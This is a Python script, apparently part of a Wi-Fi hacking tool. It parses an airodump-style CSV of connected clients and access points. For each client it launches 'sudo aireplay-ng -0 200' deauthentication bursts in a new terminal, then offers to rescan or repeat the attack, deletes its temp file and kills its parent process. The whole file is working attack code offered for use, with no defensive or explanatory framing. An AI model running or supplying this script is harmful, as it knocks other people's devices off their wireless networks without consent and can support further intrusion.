#Modules

import os
import time
import csv
from prettytable import PrettyTable
from colorama import Fore, Back, Style
from tqdm import tqdm
import signal


#Global Variables

path = os.path.dirname(os.path.abspath(__file__))
datalst = []
interfce = ""



#Functions

def start():

	global path
	global datalst
	global interfce
	print(Fore.RED + "Scaning for devices connected to the Access Point(30 sec.).")
	for i in tqdm (range (100), 
        	       desc="Progress... ", 
        	       ascii=False, ncols=75):
	    time.sleep(0.1)

	qwert = path + "/tempwifihacktdkrttxt.txt"
	tmpfiletxt = open(qwert,"r")
	tmpflnmtmp = tmpfiletxt.readlines()
	
	
	tmpflnm = tmpflnmtmp[0].split()
	
	tmpfiletxt.close()
	
	filenm = tmpflnm[0] + "-01.csv"
	interfce = tmpflnm[1] + "mon"
	
	csvfl = open(filenm , "r")
	reader = csv.reader(csvfl)
	
	for data in reader:
		if len(data) == 7 and data[0] != "Station MAC":
			datalst.append(data)
		
	APSpam()
	

def APSpam():
	
	global path
	global datalst
	global interfce

	
	if any(datalst) == True:
		print(Fore.YELLOW + "Wi-Fi De-authentication attack starting now...")
		time.sleep(0.5)
		
		for i in datalst:
			cmd1 = 'sudo aireplay-ng -0 200 -a ' + i[5] + ' -c ' + i[0] + ' ' + interfce
			cmd = "gnome-terminal --wait --geometry 105x25 -e '" + cmd1 + "'"
			os.system(cmd)
			
	elif any(datalst) == False:
		print(Fore.RED + "No device connected to the Access point.")
		rscnreq = input(Fore.GREEN + "Would you like to RESCAN? (y/n): ")
		if rscnreq == "y":
			start()
			
	rstrtreq = input("Would you like to start Wi-Fi De-authentication attack again? (y/n): ")
	if rstrtreq == "y":
		datalst = []
		start()
		
	temppth116 = path + "/tempwifihacktdkrttxt.txt"
	if os.path.isfile (temppth116) == True:
		os.remove(temppth116)
		
	os.kill(os.getppid(), signal.SIGHUP)
	
start()